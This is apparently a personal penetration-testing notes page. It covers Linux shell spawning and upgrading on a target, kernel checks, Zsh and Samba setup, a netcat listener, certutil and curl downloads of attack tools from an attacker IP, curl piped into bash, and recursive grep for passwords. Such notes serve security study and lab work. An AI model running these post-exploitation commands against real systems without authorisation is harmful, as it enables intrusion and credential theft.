---
title: '01: MORE IMPORT CMD FOR FOOTPRINTING T'
````
`````
---

# 01: MORE IMPORT CMD FOR FOOTPRINTING T

## CHECK WHICH <span style="color: #2dc26b;">PYTHON INSTALLED</span> ON LINUX

WHEREIS CMD

```
whereis python3
whereis python2
```

&nbsp;LS CMD

```
ls -ls /usr/bin/python*
```

COMPGEN CMD

```
if compgen installed
compgen -c python | grep -P '^python\d'
```

==PYTHON --VERSION==

```
python --version
python -V
```

* * *

* * *

&nbsp;

## SPAWNING INTERACTIVE SHELLS

[pentestmonkey](https://pentestmonkey.net/cheat-sheet)

[stationx reverse-shell-cheat-sheet](https://www.stationx.net/reverse-shell-cheat-sheet/)

PYTHON

```
python -c 'import pty;pty.spawn("/bin/bash");'
```

check which python installed

```
strange@Windows:~$ which python
strange@Windows:~$ which python3
/usr/bin/python3
we see python3 installed so we use it 
python3 -c 'import pty; pty.spawn("/bin/bash");'
```

&nbsp;

IF PYTHON NOT INSTALLED WE CAN USE FOLLOWING

**perl awk find or vim**

```
perl
perl —e 'exec "/bin/bash";'
awk
awk 'BEGIN {system("/bin/bash")}'
find
find . -exec /bin/bash \; -quit
vim
vim -c ':!/bin/bash'
```

&nbsp;

==**UPGRADING TO PROPER SHELL**==

1.  Checking Shell type using `ps -p $$`
    
2.  Switching to bash shell **`exec bash --login`**
    
3.  Hit ctrl + Z to put your shell in background still running `^z`
    
4.  Run following 2 commands and note output : `echo $TERM` `stty size or stty -a ,`  we just need rows and columns number
    
5.  After having required info, run following command : `stty raw -echo`
    
6.  Then run *fg* to foreground our shell, it will re-open our shell and you might not see anything :`fg`
    
7.  Just type *reset* to get shell : `reset`
    
8.  Now we have interactive shell but if we want to use entire terminal screen we need to specify shell type , rows and colmuns to our shell, thats why we noted these values. So followings commands need to be run in our shell on target :
    
    ```
    target@host:~$ export SHELL=bash
    target@host:~$ export TERM=xterm-256color
    target@host:~$ stty rows 60 columns 233
    ```
    
    Now we have fully Interactive shell on target, we can use tab completion, arrow keys, ctrl + c and everything like a normal shell.
    

&nbsp;

* * *

* * *

&nbsp;

## CHECKING KERNEL VERSION ON LINUX

UNAME CMD

```
uname -h
uname -srm

example output

Linux 4.15.0-54-generic x86_64
The output above shows that the Linux kernel is 64-bit and its version is 4.15.0-54, where:

 4 - Kernel Version.
 15 - Major Revision.
 0 - Minor Revision.
 54 - Patch number.
 generic - Distribution specific information.
```

&nbsp;

HOSTNAMECTL CMD

```
hostnamectl
grep 
hostnamectl | grep -i kernel
```

&nbsp;

/PROC/VERSION CMD

/ETC/OS-RELEASE

```
using cat or less display content of file
cat /proc/version
cat /etc/os-release
cat /proc/sys/kernel/hostname
```

&nbsp;

&nbsp;

# How to Install <span style="color: #2dc26b;">Z Shell (Zsh)</span> and <span style="color: #2dc26b;">Oh My Zsh</span> on Linux

DETAILED EXPLANATION IS [install zshell and oh my zsh on linux](https://www.makeuseof.com/install-z-shell-and-oh-my-zsh-on-linux/)

HOW TO INSTALL

```
apt zsh
confirm 
whereis zsh
change to zsh from bsh
chsh --help
```

INSTALLING OH MY ZSH{dependancies}

```
sudo apt install git-core curl fonts-powerline
```

INSTALL USING CURL/WGET

```
curl
sh -c "$(curl -fsSL https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh
wget
wget --no-check-certificate http://install.ohmyz.sh -O - | sh
```

&nbsp;

Configure Oh My Zsh on Linux

```
nano ~/.zshrc
```

<img src="../../../_resources/2024-06-24_07-50.png" alt="2024-06-24_07-50.png" width="636" height="187" class="jop-noMdConv">

TO UPDATE CHANGES

```
source ~/.zshrc
```

CHANGING THEME

```
sudo nano ~/.zshrc
to change to agnoster
ZSH_THEME="agnoster"
ZSH_THEME="random"
ZSH_THEME_RANDOM_CANDIDATES=("agnoster" "grml" "robbyrussell")
source ~/.zshrc
```

* * *

* * *

# samba SMB on kali SERVER

creating server first

INSTALL SAMBA

```
apt install samba
```

CREATE AND BACKUP SMB.CONF INCASE WE MESS

```
First, backup the original configuration file:
sudo cp /etc/samba/smb.conf /etc/samba/smb.conf.bak
```

EDIT SMB.CONF TO PREVERENCE

```
sudo nano /etc/samba/smb.conf

Scroll to the end of the file and add your share definition. Here's an example:
[MyShare]

  path = /path/to/your/folder

  available = yes

  valid users = your-username

  read only = no

  browsable = yes

  public = yes

  writable = yes
```

&nbsp;

SET SAMBA PASSWORD

```
Set Samba Password

For the user specified in the smb.conf file, set a Samba password:
sudo smbpasswd -a your-username(kali)
```

&nbsp;

RESTART SAMBA SERVICE(smbd)

```
To apply the changes, restart the Samba service:
sudo systemctl restart smbd
To enable SMB service to auto-start on boot:
sudo systemctl enable smbd
*********
systemctl start smbd
after that enabled 
systemctl enable smbd #MUST BE ENABLED
smbpasswd -a (user-kali)
smbpasswd -e (user eg kali)
```

systemctl enable smbd

<img src="../../../_resources/2024-07-01_13-31.png" alt="2024-07-01_13-31.png" width="428" height="160" class="jop-noMdConv"><img src="../../../_resources/2024-07-01_13-34.png" alt="2024-07-01_13-34.png" width="434" height="182" class="jop-noMdConv">

FIREWALL RULES(OPTIONAL)

```
If you're running a firewall, you may need to allow Samba through:
sudo ufw allow samba
```

&nbsp;

TROUBLESHOOTING

1.  **Log Files** : Check the Samba log files in \`/var/log/samba/\` for any issues.
    
2.  **Test Locally** : You can test the Samba share locally using `smbclient` like so: `smbclient //localhost/MyShare -U your-username`
    

- [ ] **NOTE!!!** ==MyShare== NAME KINDLY
- [ ] <img src="../../../_resources/2024-07-02_19-06.png" alt="2024-07-02_19-06.png" width="214" height="81" class="jop-noMdConv">

ACCESS FROM WINDOWS MACHINE SHARE

```
From another computer on the same network, you should now be able to access the shared folder. The location will be 
\\your-server-ip\MyShare on Windows 
or
 smb://your-server-ip/MyShare on macOS and Linux.
```

&nbsp;

&nbsp;

# MORE SHELLS FOR PENTESTING

**Method 1: Using ==<span style="color: #2dc26b;">Python's Built-in HTTP Server</span>==**

**==<span style="color: #2dc26b;">nice link with good explainations https://juggernaut-sec.com/linux-file-transfers-for-hackers/</span>==**

Python has a built-in HTTP server module that can be used to set up a simple HTTP server. Here's how:

1.  Open a terminal on your Kali Linux machine.
2.  Navigate to the directory where you want to serve files from. For example, let's say you want to serve files from the `/home/kali/Desktop` directory:

```
cd /home/kali/Desktop
```

3.  Start the Python HTTP server using the following command:
    
    ```
    python3 -m http.server 80
    or 
    python -m SimpleHTTPServer 80
    ```
    

This will start an HTTP server on port 80, which is the default port for HTTP.

4.  By default, the server will serve files from the current working directory (`/home/kali/Desktop` in this case).
    
5.  You can access the HTTP server by visiting `http://localhost:80` or `http://your-kali-ip:80` in a web browser.
    

method 2: Using <span style="color: #2dc26b;">**==netcat listener nc==**</span>

```
nc -nlvp 444
```

method 3:Using <span style="color: #2dc26b;">meterpreter</span>

# WINDOWS MACHINE downloading exploits

<span style="color: #d1d5db;"><span style="color: #000000;">==CertUtil== to download a file from a remote location</span>!</span>

```
 certutil -urlcache -f <http://ip/path> filename {to store with}
 
```

is a clever way to download a file from a web server using CertUtil, a built-in Windows tool

Here's a breakdown of the command:

- [ ] `certutil`: This is the CertUtil command-line tool, which is typically used for managing certificates and certificate revocation lists (CRLs). However, it also has a lesser-known feature that allows it to download files from URLs.
    
- [ ] `-urlcache`: This option tells CertUtil to use the URL cache feature, which allows it to download files from a specified URL.
    
- [ ] `-f`: This option forces CertUtil to download the file, even if it already exists in the cache.
    
- [ ] `<http://ip/path>`: This is the URL of the file you want to download. Replace `<ip>` with the IP address of the web server, and `<path>` with the path to the file you want to download.
    
- [ ] **NOTE!!!** try to check on cd <span style="color: #2dc26b;">C:\\windows\\Temp</span> mostly is writeable
    

&nbsp;

### ==Curl== very powerful tool to interact with webservers <span style="color: #ffffff;">is a very powerful tool that can be used to interact with web servers</span>

```
curl 172.16.1.30/linpeas.sh -o /dev/shm/linpeas.sh
after download make write permissions to X
chmod 755 ./linpeas.sh
```

<span style="color: #000000;"><span>Alternatively, we can pipe the</span> **curl** <span>command directly into</span> **bash**</span><span style="color: #ffffff;"><span style="color: #000000;">, which will download the script directly into memory.</span></span>

```
curl 172.16.1.30/linpeas.sh | bash
```

<span style="color: #ffffff;">Doing this, the file is never actually downloaded to disk.</span>

&nbsp;

&nbsp;

* * *

&nbsp;

## ENUMARATIONS WITHIN

cmd `findstr` cmd `wmic qfc` cmd

cmd `wmic localdisk`

* * *

MSF

msf `local_exploit_suggester` msf

&nbsp;

# ENUMERATIONS ON LINUX MACHINE

[book.hacktricks.xyz privilege-escalation#system-information](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#system-information)

Check arctecture of machine

```
cat /proc/version
uname -a
searchsploit "Linux Kernel"
lscpu #
```

MORE SYS ENUM

```
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```

PASSWRD https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/#find-sensitive-files

```
grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2>/dev/null
```

netstat CMD VERY IMPORT

```
netstat -tulpn # all listensing active services very well
```
